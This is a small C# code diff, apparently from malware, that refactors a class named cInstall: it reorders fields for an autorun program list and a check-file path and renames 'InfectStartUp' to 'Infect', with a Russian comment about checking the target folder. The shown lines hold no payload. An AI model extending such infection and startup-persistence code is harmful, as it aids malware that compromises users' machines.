@@ -8,15 +8,13 @@ namespace Overwatch
 {
     class cInstall
     {
-        static List<AutorunProgram> autorunPrograms = new List<AutorunProgram>();
-
         static Random random = new Random();
-
         static appLog Log = new appLog();
 
-        static string local_path_checkfile = Path.Combine(Path.GetDirectoryName(appConfing.MyFullPath), appConfing.checkFile);
+        private static List<AutorunProgram> autorunPrograms = new List<AutorunProgram>();
+        private static string local_path_checkfile = Path.Combine(Path.GetDirectoryName(appConfing.MyFullPath), appConfing.checkFile);
 
-        public static void InfectStartUp(string[] args = null)
+        public static void Infect(string[] args = null)
         {
             // Проверяем, в рабочей/целевой ли папке находиться приложение
             if (InTargetLocation())
